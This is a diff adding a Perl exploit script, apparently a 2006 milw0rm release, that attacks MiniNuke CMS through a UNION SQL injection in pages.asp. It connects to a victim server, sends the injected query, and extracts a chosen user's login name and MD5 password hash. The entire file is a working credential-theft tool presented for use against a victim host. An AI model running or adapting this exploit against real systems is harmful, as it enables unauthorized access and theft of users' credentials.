@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Orginal advisory: http://www.nukedx.com/?viewdoc=9
+#Usage: mini.pl <victim.com> </mininuke-dir> <userid>
+use IO::Socket;
+if(@ARGV != 3){
+print "
++**********************************************************************+
++Welcome to MiniNuke CMS System all versions (pages.asp) SQL-inject xpl+
++            Usage: mini.pl <victim> <directory> <userid>              +
++                    Example: mini.pl sux.com / 1                      +
++               Method found & Exploit scripted by nukedx              +
++**********************************************************************+
+";
+exit();
+}
+#Local variables
+$server = $ARGV[0];
+$server =~ s/(http:\/\/)//eg;
+$port = "80";
+$mndir = $ARGV[1];
+$victimid = $ARGV[2];
+$sreq ="http://".$server.$mndir."pages.asp?id=3%20union+select+0,kul_adi,sifre,0,0+from+members+where+uye_id=".$victimid;
+#Writing data to socket
+print "+**********************************************************************+\n";
+print "+ Trying to connect: $server\n";
+$mns = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
+print $mns "GET $sreq\n";
+print $mns "Host: $server\n";
+print $mns "Accept: */*\n";
+print $mns "Connection: close\n\n";
+print "+ Connected!...\n";
+	while($answer = <$mns>) {
+		if ($answer =~ /([\d,a-f]{32})/) { 
+			print "+ USERID: $victimid\n";
+                        print "+ MD5 HASH: $1\n";
+			print "+**********************************************************************+\n";
+			exit(); }
+		if ($answer =~ /number of columns/) { 
+                print "+ This version of Mini-Nuke is vulnerable too but default query of SQL-inject does not work on it\n";
+                print "+ So please edit query by manually adding null data..\n";
+                exit(); }
+	}
+print "+ Exploit failed\n";
+print "+**********************************************************************+\n";
+
+# nukedx.com [2006-02-19]
+
+# milw0rm.com [2006-02-19]
